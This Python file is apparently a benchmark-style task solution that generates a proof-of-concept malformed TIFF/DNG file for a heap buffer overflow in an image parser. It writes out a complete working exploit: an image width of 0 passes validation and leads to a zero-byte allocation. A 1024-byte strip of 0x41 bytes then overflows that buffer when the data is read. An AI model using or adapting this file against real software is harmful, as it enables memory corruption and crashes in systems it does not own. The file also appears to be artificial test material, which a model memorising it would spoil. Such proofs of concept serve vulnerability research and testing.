import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Buffer Overflow vulnerability.
        The vulnerability allows zero width or height images to pass validation,
        leading to a 0-byte allocation and subsequent heap overflow when image data is read.
        """
        # Construct a TIFF/DNG compatible file
        # Little-endian byte order
        endian = '<'
        # TIFF Header: Magic 'II' (0x4949), Version 42, Offset to first IFD (8)
        header = struct.pack(endian + '2sHI', b'II', 42, 8)

        # IFD Entries (Must be sorted by Tag ID)
        entries = []
        
        # Tag 256 (0x100) ImageWidth: 0 (The trigger)
        # Type 4 (LONG), Count 1, Value 0
        entries.append(struct.pack(endian + 'HHII', 256, 4, 1, 0))
        
        # Tag 257 (0x101) ImageLength: 10
        # Type 4 (LONG), Count 1, Value 10
        entries.append(struct.pack(endian + 'HHII', 257, 4, 1, 10))
        
        # Tag 258 (0x102) BitsPerSample: 8
        # Type 3 (SHORT), Count 1, Value 8
        entries.append(struct.pack(endian + 'HHII', 258, 3, 1, 8))
        
        # Tag 259 (0x103) Compression: 1 (None)
        # Type 3 (SHORT), Count 1, Value 1
        entries.append(struct.pack(endian + 'HHII', 259, 3, 1, 1))
        
        # Tag 262 (0x106) PhotometricInterpretation: 1 (BlackIsZero)
        # Type 3 (SHORT), Count 1, Value 1
        entries.append(struct.pack(endian + 'HHII', 262, 3, 1, 1))
        
        # Tag 273 (0x111) StripOffsets: Will be calculated
        # Placeholder for now (Index 5)
        entries.append(b'\x00' * 12)
        
        # Tag 277 (0x115) SamplesPerPixel: 1
        # Type 3 (SHORT), Count 1, Value 1
        entries.append(struct.pack(endian + 'HHII', 277, 3, 1, 1))
        
        # Tag 278 (0x116) RowsPerStrip: 10
        # Type 4 (LONG), Count 1, Value 10
        entries.append(struct.pack(endian + 'HHII', 278, 4, 1, 10))
        
        # Tag 279 (0x117) StripByteCounts: 1024
        # Large enough to cause overflow when writing to 0-sized buffer
        # Type 4 (LONG), Count 1, Value 1024
        entries.append(struct.pack(endian + 'HHII', 279, 4, 1, 1024))
        
        # Calculate Offsets
        num_entries = len(entries)
        # Header (8) + Count (2) + Entries (12 * N) + NextOffset (4)
        ifd_size = 2 + (12 * num_entries) + 4
        data_offset = 8 + ifd_size
        
        # Update StripOffsets (Tag 273 at index 5)
        entries[5] = struct.pack(endian + 'HHII', 273, 4, 1, data_offset)
        
        # Assemble IFD
        ifd = struct.pack(endian + 'H', num_entries) + b''.join(entries) + struct.pack(endian + 'I', 0)
        
        # Payload (Image Data)
        payload = b'\x41' * 1024
        
        return header + ifd + payload